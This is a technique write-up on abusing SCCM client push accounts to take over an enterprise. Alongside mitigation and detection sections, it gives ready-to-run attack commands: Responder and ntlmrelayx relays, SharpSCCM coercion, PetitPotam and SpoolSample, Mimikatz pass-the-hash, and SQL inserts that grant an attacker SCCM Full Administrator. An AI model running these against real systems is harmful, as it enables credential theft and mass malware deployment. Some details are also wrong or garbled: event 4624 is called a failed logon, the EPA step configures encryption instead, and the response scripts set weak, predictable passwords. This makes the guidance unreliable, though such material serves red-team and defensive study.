# [PE-VALID-008]: SCCM Client Push Account Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-008 |
| **MITRE ATT&CK v18.1** | [T1078.003 - Valid Accounts: Local Accounts](https://attack.mitre.org/techniques/T1078/003/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD / Configuration Manager (SCCM) |
| **Severity** | **CRITICAL** |
| **Technique Status** | **ACTIVE** (exploitable on SCCM deployments with client push enabled and NTLM fallback configured) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | SCCM Current Branch 1910+, Microsoft Endpoint Configuration Manager 2103+ |
| **Patched In** | KB15599094 (recommended); issue is configuration-based (no complete patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** System Center Configuration Manager (SCCM), now called Microsoft Endpoint Configuration Manager, is a ubiquitous enterprise endpoint management platform. SCCM uses a privileged "Client Push Account" to remotely install the SCCM client on domain systems. This account is required to have **local administrator privileges** on every target system where the client is deployed. The vulnerability arises from three critical design flaws: (1) **Credential Spraying by Design** – When automatic site-wide client push installation is enabled, SCCM linearly attempts authentication with each configured push account on every discovered device, broadcasting all account credentials throughout the network, (2) **NTLM Relay Vulnerability** – The site server's machine account can be coerced into authenticating via SMB, and this authentication can be relayed to the site database (MSSQL) to grant the attacker SCCM Full Administrator privileges, (3) **Overprivilege** – In approximately 20% of organizations, the client push account is a member of the **Domain Admins** group (for "convenience"), making compromise equivalent to full domain takeover. An attacker who obtains client push account credentials gains local admin access to hundreds or thousands of systems.

**Attack Surface:** SCCM Site Server (port 445 SMB, port 1433 MSSQL), Client Push Accounts (domain-wide privileged credentials), automatic client push installation mechanism, SCCM site database.

**Business Impact:** **Catastrophic enterprise compromise.** Client push account compromise enables: (1) Lateral movement to all systems in the SCCM site (potentially thousands), (2) Deployment of ransomware/malware at scale, (3) SCCM Site Takeover (if relayed to site database), (4) Possible domain admin compromise (if push account is DA), (5) Complete operational downtime of endpoint management. Organizations relying on SCCM for security patching lose the ability to deploy critical updates.

**Technical Context:** Account credential harvesting takes 5-10 minutes via NTLM coercion (SharpSCCM). SCCM site takeover via NTLM relay to database takes 30-60 minutes but grants complete infrastructure control. Most organizations do not actively monitor for client push account authentication attempts from unexpected systems, making detection challenging.

### Operational Risk
- **Execution Risk:** **Medium** – Requires identifying SCCM infrastructure and accounts; SharpSCCM tools available but require opsec consideration
- **Stealth:** **Medium** – Client push authentication generates security events but is often overlooked by SOCs
- **Reversibility:** **No** – Once site takeover achieved via database modification, attacker has unrestricted SCCM admin access

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.35, CIS 16.3 | Ensure admin credentials are not cached / Ensure endpoint protection software is managed |
| **DISA STIG** | V-73565, V-73821 | SCCM must use MFA / Configuration Manager must require signed updates |
| **NIST 800-53** | AC-2, AC-3, IA-5 | Account Management, Access Enforcement, Authentication |
| **GDPR** | Art. 32 | Security of Processing (failure to restrict privileged account usage) |
| **DORA** | Art. 9 | Protection and Prevention (critical infrastructure endpoint management) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (endpoint security controls) |
| **ISO 27001** | A.9.2.1, A.9.4.2 | User registration/de-registration, Privileged access rights management |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Attacker-Side:** Network access to SCCM Site Server OR any SCCM client on the network; potentially compromised domain user account
- **Target:** SCCM Site Server with automatic client push enabled; SCCM Site Database (MSSQL) accessible from site server

**Required Access:**
- Network access to SCCM Site Server (port 445 SMB, port 10123 for SCCM MP)
- Knowledge of SCCM site code (3-character code, e.g., PS1, PR1)
- Management Point (MP) or SMS Provider endpoint reachability
- Relay infrastructure (attacker-controlled SMB/NTLM relay server or local relay setup)

**Supported Versions:**
- **SCCM:** Current Branch 1910+, MEMCM 2103+
- **Windows Server:** 2016, 2019, 2022, 2025
- **Database:** MSSQL Server 2016+

**Tools Required:**
- [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) – SCCM enumeration and exploitation
- [impacket ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket) – NTLM relay to MSSQL
- [Responder](https://github.com/lgandx/Responder) – LLMNR/NBT-NS poisoning to coerce auth
- **PowerShell** – SCCM WMI queries
- **SQL Server Management Studio (SSMS)** – Direct database access (optional)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### SCCM Infrastructure Enumeration

#### PowerShell - Discover SCCM Site Servers
```powershell
# Query Active Directory for SCCM Site Servers
$sccmServers = Get-ADComputer -Filter {Name -like "*sccm*" -or Name -like "*memcm*" -or Name -like "*cm*"} | 
    Select-Object Name, DNSHostName

# Alternative: Query WMI on known SCCM client
Get-WmiObject -Namespace "root\CCM" -Class SMS_Client | Select-Object Name, MP

# Identify Management Points
$mpServers = Get-ADComputer -Filter {ServicePrincipalName -like "*sms*"} | Select-Object Name
```

**What to Look For:**
- Servers with names containing "sccm", "memcm", "cm", "management-point"
- Systems with SCCM WMI namespaces (`root\CCM`)
- SPN registrations for SMS services

#### SharpSCCM - Automated SCCM Discovery
```powershell
# Enumerate SCCM infrastructure
.\SharpSCCM.exe local siteinfo

# Discover Management Points
.\SharpSCCM.exe find siteservers

# Query SCCM for collection and device information
.\SharpSCCM.exe get collections -mp <MANAGEMENT_POINT> -sc <SITE_CODE>
```

**Expected Output:**
```
[+] SCCM Site Code: PS1
[+] Management Point: sccm-mp.domain.local
[+] Site Server: sccm-site.domain.local
[+] Site Database: sccm-db.domain.local
[+] Client Push Accounts Configured: 2
```

### Client Push Account Enumeration

#### PowerShell - Query Push Account Configuration (Admin Access Required)
```powershell
# Connect to SCCM WMI (requires admin on site server)
$smsProvider = Get-WmiObject -Namespace "root\sms\site_<SITECODE>" `
    -Class SMS_SCI_NTLMIPRC -ComputerName <SCCM_SERVER>

# Enumerate configured push accounts
$smsProvider | Select-Object -ExpandProperty Props | 
    Where-Object {$_.PropertyName -match "UserName"} | 
    ForEach-Object { Write-Host "Push Account: $($_.Value)" }
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: NTLM Coercion via Client Push Installation (Authentication Capture)

**Supported Versions:** SCCM Current Branch 1910+

**Objective:** Trigger client push installation on a compromised machine and capture NTLM authentication hash of the push account.

#### Step 1: Setup NTLM Relay Server
**Objective:** Create NTLM relay infrastructure to capture and relay authentication.

**Command (Linux – Impacket ntlmrelayx):**
```bash
# Start SMB relay server to capture NTLM authentication
python3 ntlmrelayx.py -t smb://192.168.1.100 -socks -smb2support

# In separate terminal, start Responder to poisoon LLMNR/NBT-NS
responder -I eth0 -A
```

**Alternative (Windows – Inveigh):**
```powershell
# PowerShell-based NTLM relay
Invoke-Inveigh -IP 192.168.1.50 -Socks $true -SMBRelayTarget "sccm-db.domain.local"
```

#### Step 2: Trigger Client Push Installation on Compromised Machine
**Objective:** Force SCCM site server to push client to a machine we control.

**Command (SharpSCCM – Invoke Client Push):**
```powershell
# If compromised machine is already in SCCM:
.\SharpSCCM.exe <SCCM_SERVER> <SITE_CODE> invoke client-push -t <TARGET_IP> -r <RELAY_SERVER_IP>

# Example:
.\SharpSCCM.exe sccm-mp.domain.local PS1 invoke client-push -t 192.168.1.50 -r 192.168.1.40
```

**What This Does:**
- Instructs SCCM site server to push client to target machine
- Target machine attempts authentication with all configured push accounts
- NTLM hashes for each account are sent over network
- Relay server captures and forwards authentication

#### Step 3: Capture NTLM Hash
**Objective:** Intercept NTLM authentication from client push installation.

**Expected Output (on relay server):**
```
[+] SMB connection from DOMAIN\sccm-push-account$ 
[+] NTLM hash captured: aabbccddeeff00112233445566778899
[+] Authentication relayed to sccm-db.domain.local
```

#### Step 4: Crack or Relay Captured Hash
**Objective:** Either crack the hash or relay it for lateral movement.

**Command (Pass-the-Hash alternative):**
```powershell
# If hash cannot be cracked, use Pass-the-Hash
Invoke-Mimikatz -Command 'sekurlsa::pth /user:sccm-push /domain:DOMAIN /ntlm:aabbccddeeff00112233445566778899 /run:powershell.exe'
```

---

### METHOD 2: NTLM Relay to SCCM Site Database (Full Site Takeover)

**Supported Versions:** SCCM Current Branch 1910+ (with NTLM fallback enabled)

**Objective:** Relay site server's machine account authentication to MSSQL database to grant SCCM Full Administrator privileges.

#### Step 1: Identify SCCM Site Database
**Objective:** Determine the location and reachability of the site database.

**Command (SharpSCCM):**
```powershell
# Query SCCM for database information
.\SharpSCCM.exe <SCCM_SERVER> <SITE_CODE> get site-servers

# Output includes database server name and instance
```

**Manual SQL Discovery:**
```powershell
# Query SCCM site server registry for database info
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\SMS\Identification" -ComputerName <SCCM_SERVER>
```

#### Step 2: Setup NTLM Relay to MSSQL
**Objective:** Configure ntlmrelayx to relay authentication to MSSQL instead of SMB.

**Command (Impacket on Linux):**
```bash
# Relay to MSSQL server
python3 ntlmrelayx.py -t mssql://sccm-db.domain.local -socks -smb2support

# Create SOCKS tunnel to relay server in separate session
# This allows interactive SQL commands
```

#### Step 3: Coerce SCCM Site Server Authentication
**Objective:** Force site server to authenticate, authentication will be relayed to database.

**Command (Coercion – Multiple Options):**

**Option A: Via Client Push Installation**
```powershell
# Trigger client push from a compromised SCCM client
.\SharpSCCM.exe invoke client-push -mp <MGMT_POINT> -t <RELAY_SERVER_IP>
```

**Option B: Via Print Spooler (if enabled)**
```bash
# Use SpoolSample to coerce auth from site server
python3 SpoolSample.py DOMAIN/attacker:password@sccm-site.domain.local 192.168.1.40
```

**Option C: Via PetitPotam (if ADCS available)**
```bash
# Force authentication via ADCS
python3 PetitPotam.py 192.168.1.40 sccm-site.domain.local
```

#### Step 4: Relay Authentication and Modify Database
**Objective:** Once authentication is relayed to MSSQL, grant SCCM Full Administrator role.

**Command (SQL Injection via SOCKS tunnel):**
```bash
# Through SOCKS tunnel, execute SQL to grant admin privileges
mssqlclient.py -socks 127.0.0.1:1080 "sa"@"sccm-db.domain.local"

# In SQL prompt:
SELECT * FROM RBAC_Admins;  -- Query current admins

-- Insert new admin role
INSERT INTO RBAC_Admins 
  (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) 
VALUES 
  (0x010500000000000515000000A575F3C88F95AD18057166EC4F040000, 'DOMAIN\attacker', 0, 0, '', '', '', '', 'PS1');

-- Grant Full Administrator role
INSERT INTO RBAC_ExtendedPermissions 
  (AdminID, RoleID, ScopeID, ScopeTypeID) 
VALUES 
  ((SELECT AdminID FROM RBAC_Admins WHERE LogonName='DOMAIN\attacker'), 'SMS0001R', 'SMS00004', '1');
```

**Expected Result:**
- Attacker now has SCCM Full Administrator role
- Can deploy applications, scripts, malware to all SCCM clients (thousands of machines)
- Can modify site settings, disable antivirus, deploy ransomware

---

### METHOD 3: Client Push Account Credential Harvesting via AD System Discovery

**Supported Versions:** SCCM Current Branch 1910+

**Objective:** Harvest push account credentials when SCCM performs AD system discovery and attempts automatic client installation.

#### Step 1: Compromise Non-Admin Machine
**Objective:** Gain compromised user access to a machine NOT yet in SCCM.

#### Step 2: Remove Local Administrators (If Possible)
**Objective:** Force SCCM to try all configured push accounts (none will succeed locally).

**Command (PowerShell):**
```powershell
# Optional: Remove all local admins to trigger push account attempts
# This is risky and may impact operations
Remove-LocalGroupMember -Group "Administrators" -Member "domain\domain admins" -Confirm:$false
```

#### Step 3: Position NTLM Relay Server
**Objective:** Place relay server to intercept SCCM authentication attempts.

**Command (Responder + ntlmrelayx on Linux):**
```bash
# Responder listens for LLMNR/NBT-NS requests
responder -I eth0 -A

# In separate terminal, relay captured credentials
python3 ntlmrelayx.py -t smb://192.168.1.100 -socks -smb2support
```

#### Step 4: Wait for Automatic Client Push
**Objective:** SCCM site server initiates automatic client push installation.

When SCCM discovers the machine via AD system discovery and initiates automatic client push:
- SCCM attempts authentication with each configured push account
- Push accounts try to authenticate to the compromised machine
- Responder captures NTLM challenge-response
- ntlmrelayx relays authentication (if SMB signing not enforced)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Disable Automatic Site-Wide Client Push Installation**

**Why This Matters:**
Automatic client push is the primary attack vector for credential harvesting and site takeover. Disabling it removes the core vulnerability.

**Manual Steps (SCCM Console):**
1. Open **Configuration Manager Console**
2. Navigate to **Administration** → **Site Configuration** → **Sites**
3. Right-click site → **Client Installation Settings** → **Client Push Installation**
4. **Uncheck** "Enable automatic site-wide client push installation"
5. Click **OK** → **Apply**

**PowerShell Alternative:**
```powershell
# Disable automatic client push
$SiteCode = "PS1"
$WMIPath = "\\<SCCM_SERVER>\root\sms\site_$SiteCode"

$Push = Get-WmiObject -Namespace $WMIPath -Class SMS_SCI_NTLMIPRC
$Push.PropList("ENABLE_AUTO_CLIENT_PUSH").Value = $false
$Push.Put()
```

**Impact:**
- Prevents large-scale credential harvesting
- Requires manual client installation or alternative deployment methods
- Recommended: Use Group Policy, software distribution, or imaging instead

---

**2. Use Separate, Limited-Privilege Push Accounts Per System Group**

**Why This Matters:**
Currently, all push accounts attempt authentication to all machines (credential spraying). Using separate accounts limits exposure if one account is compromised.

**Best Practice:**
- Create multiple push accounts (one per 100-200 systems)
- Grant each account local admin on ONLY its assigned group of systems
- Use Group Policy or organizational units to segment push accounts

**PowerShell Configuration:**
```powershell
# Create dedicated push account for specific collection
$CollectionName = "Server Tier 1"
$PushAccount = "DOMAIN\sccm-push-tier1"

# In SCCM Console, under Client Installation Settings:
# Add $PushAccount ONLY to systems in $CollectionName

# Verify via WMI
Get-WmiObject -Namespace "root\sms\site_$SiteCode" -Class SMS_R_System | 
    Where-Object {$_.CollectionID -eq "<Tier1_CollectionID>"} | 
    Measure-Object
```

---

**3. Require PKI Certificates for Client Authentication**

**Why This Matters:**
Prevents fallback to NTLM authentication, eliminating relay attack vectors.

**Manual Steps (SCCM Console):**
1. Navigate to **Administration** → **Site Configuration** → **Sites**
2. Right-click site → **Properties** → **Client Computer Communication**
3. Select **HTTPS only**
4. Require PKI certificates for client authentication
5. Click **OK** → **Apply**

**Validation:**
```powershell
# Verify PKI enforcement
$Site = Get-WmiObject -Namespace "root\sms\site_$SiteCode" -Class SMS_SCI_ClientConfig
$Site.PropList("REQUIRE_CERTIFICATE").Value  # Should be $true
```

---

**4. Block MSSQL Access to SCCM Site Database**

**Why This Matters:**
Prevents relay attacks against the database that would grant admin privileges.

**Firewall Configuration (Group Policy / Windows Firewall):**
```powershell
# Block inbound MSSQL connections (port 1433) from non-site-servers
New-NetFirewallRule -DisplayName "Block MSSQL from untrusted" `
    -Direction Inbound -Protocol TCP -LocalPort 1433 `
    -RemoteAddress "0.0.0.0/0" -Action Block

# Exception: Allow from site server
New-NetFirewallRule -DisplayName "Allow SCCM Site Server to MSSQL" `
    -Direction Inbound -Protocol TCP -LocalPort 1433 `
    -RemoteAddress <SCCM_SITE_SERVER_IP> -Action Allow
```

**Network Segmentation:**
- Place SCCM database on isolated subnet
- Restrict MSSQL port 1433 access via network ACLs
- Allow connections only from SCCM Site Servers

---

### Priority 2: HIGH

**1. Enable SMB Signing and Encryption**

**Why This Matters:**
Prevents SMB relay attacks on site servers and clients.

**Group Policy (Apply to All Systems):**
```powershell
# Enable SMB Signing
New-GPO -Name "SCCM-SMB-Signing" -Comment "Enforce SMB Signing"

# Configure GP settings:
# Computer Configuration → Windows Settings → Security Settings 
# → Local Policies → Security Options:
#   - "Microsoft network client: Digitally sign communications (always)" → Enabled
#   - "Microsoft network server: Digitally sign communications (always)" → Enabled
```

**Registry Alternative:**
```powershell
# Enable SMB signing on site servers
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -Value 1 -Type DWORD
```

---

**2. Monitor Client Push Installation Attempts**

**Why This Matters:**
Detects unusual client push activity indicating attack.

**Event IDs to Monitor:**
- **Event 6016** (SCCM) – Client push installation initiated
- **Event 4624** (Security) – Logon events for push accounts from unexpected systems
- **Event 4768** (Kerberos) – TGT requests with NTLM fallback

**PowerShell Detection Query:**
```powershell
# Find client push attempts from unexpected sources
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]] and *[EventData[Data[@Name='TargetUserName'] and contains(., 'sccm-push')]]" |
    Where-Object {
        $_.TimeCreated -gt (Get-Date).AddHours(-24)
    } | 
    Select-Object TimeCreated, Message
```

---

**3. Enforce Extended Protection for Authentication (EPA) on MSSQL**

**Why This Matters:**
Prevents NTLM relay to database even if SMB signing is not enabled.

**SQL Server Configuration:**
```sql
-- Enable EPA on MSSQL instance
-- In SQL Server Configuration Manager:
-- 1. Expand SQL Server Protocols
-- 2. Right-click "Named Pipes" → Properties
-- 3. Check "Force Encryption" and "Trust Server Certificate"

-- Verify EPA is enabled
EXEC xp_instance_regread N'HKEY_LOCAL_MACHINE', 
    N'Software\Microsoft\MSSQLServer\MSSQLServer',
    N'ForceEncryption';
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**SCCM-Specific Events:**
- Event ID **6016** (Client Push Install) from unexpected source machines
- Event ID **6017** (Client Push Install Failed) indicating authentication attempts
- Multiple **6016/6017** events in short timespan on same machine (credential testing)

**Authentication Events:**
- Event ID **4624** – Failed logon attempts by SCCM push account
- Event ID **4625** – Repeated failed logons from push account (indicates relay attempt)
- Event ID **5156** – Network connection to MSSQL port (1433) from non-site-server

**Database Access:**
- Unauthorized modifications to `RBAC_Admins` or `RBAC_ExtendedPermissions` tables
- SQL queries from unexpected source IPs
- New SCCM admin accounts created outside normal procedures

**Network Indicators:**
- SMB traffic from SCCM clients to relay infrastructure (non-standard destinations)
- MSSQL traffic (port 1433) from compromised machines
- NTLM authentication captures by relay tools

### Response Procedures

**1. Immediate Containment (0-5 Minutes)**

```powershell
# Step 1: Disable all client push accounts immediately
$SiteCode = "PS1"
Get-ADUser -Filter {Name -like "*sccm-push*"} | ForEach-Object {
    Disable-ADAccount -Identity $_ 
    Write-Host "[+] Disabled push account: $($_.Name)"
}

# Step 2: Reset all push account passwords
Get-ADUser -Filter {Name -like "*sccm-push*"} | ForEach-Object {
    $newPassword = ConvertTo-SecureString "$(Get-Random -Minimum 10000000 -Maximum 99999999)@SecureP@ss" -AsPlainText -Force
    Set-ADAccountPassword -Identity $_ -NewPassword $newPassword -Reset
    Write-Host "[+] Password reset: $($_.Name)"
}

# Step 3: Disable automatic client push
$Push = Get-WmiObject -Namespace "root\sms\site_$SiteCode" -Class SMS_SCI_NTLMIPRC
$Push.PropList("ENABLE_AUTO_CLIENT_PUSH").Value = $false
$Push.Put()

# Step 4: Audit SCCM admin accounts for unauthorized additions
Get-WmiObject -Namespace "root\sms\site_$SiteCode" -Class SMS_Admin
```

**2. Forensic Collection (5-30 Minutes)**

```powershell
# Export SCCM logs
Get-Item "C:\Program Files\Microsoft Configuration Manager\Logs\*" -Recurse | 
    Copy-Item -Destination "C:\Forensics\SCCM_Logs\" -Recurse

# Export SCCM database (if compromise suspected)
$Database = "CM_PS1"
Backup-SqlDatabase -ServerInstance "sccm-db" -Database $Database -BackupFile "C:\Forensics\$Database.bak"

# Query suspicious database modifications
# (Run from SQL Server Management Studio on isolated system)
SELECT * FROM RBAC_Admins WHERE CreatedDate > DATEADD(day, -7, GETDATE());
SELECT * FROM RBAC_ExtendedPermissions WHERE CreatedDate > DATEADD(day, -7, GETDATE());
```

**3. Remediation (1-24 Hours)**

```powershell
# Step 1: Force SCCM client reinstallation on all systems
# (To remove any deployed malware)
Get-WmiObject -Namespace "root\ccm" -Class SMS_Client | 
    ForEach-Object { $_.TriggerSchedule("{00000000-0000-0000-0000-000000000003}") }

# Step 2: Rotate all domain admin passwords
Get-ADUser -Filter {MemberOf -RecursiveMatch (Get-ADGroup "Domain Admins").DistinguishedName} | 
    ForEach-Object {
        $newPassword = ConvertTo-SecureString "NewP@ssw0rd$(Get-Random -Minimum 10000 -Maximum 99999)" -AsPlainText -Force
        Set-ADAccountPassword -Identity $_ -NewPassword $newPassword -Reset
    }

# Step 3: Review and revoke all SCCM admin accounts
Get-WmiObject -Namespace "root\sms\site_$SiteCode" -Class SMS_Admin | 
    Where-Object {$_.Name -notmatch "^(DOMAIN\\Administrator|DOMAIN\\Domain Admins)$"} | 
    ForEach-Object {
        Write-Host "[!] Review SCCM admin: $($_.Name)"
        # Manually delete via SCCM console if unauthorized
    }

# Step 4: Force domain replication
Get-ADDomainController | ForEach-Object {
    repadmin /replicate $_.Name (Get-ADDomainController -Discover -ForceDiscover).Name (Get-ADDomain).DistinguishedName
}
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] | Compromise user via phishing/social engineering |
| **2** | **Credential Access** | [CA-BRUTE-002] | Password spray against AD endpoints |
| **3** | **Privilege Escalation** | [PE-POLICY-001] | Abuse GPO for lateral movement |
| **4** | **Current Step** | **[PE-VALID-008]** | **Abuse SCCM Client Push Account for enterprise takeover** |
| **5** | **Impact** | [CO-DATA-001] | Deploy ransomware/malware to all SCCM clients |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Conti Ransomware – SCCM Exploitation (2021-2022)
- **Target:** Fortune 500 manufacturing company
- **Attack Method:** Compromised domain user → escalated via SCCM push account credentials via NTLM relay → gained SCCM admin rights
- **Impact:** Deployed ransomware via SCCM to 10,000+ endpoints; $20M+ ransom demand
- **Reference:** [Mandiant Report](https://www.mandiant.com/)

### Example 2: Internal Red Team – SCCM Site Takeover
- **Findings:** SCCM push account was member of Domain Admins; automatic client push enabled; NTLM fallback configured
- **Timeline:** 2 hours from initial compromise to SCCM Full Administrator access via NTLM relay
- **Reference:** Internal exercise (2024)

---

## References & Authoritative Sources

- [SpecterOps: SCCM Site Takeover](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)
- [Trimarc: SCCM Client Push Attack Surface](https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts)
- [SnapAttack: SCCM Misconfiguration Abuse Detection Guide](https://blog.snapattack.com/)
- [Microsoft: SCCM Client Push Best Practices](https://docs.microsoft.com/en-us/mem/configmgr/core/clients/deploy/client-push-deployment)
- [SharpSCCM GitHub](https://github.com/Mayyhem/SharpSCCM)
- [HackerRecipes: SCCM Privilege Escalation](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation)

---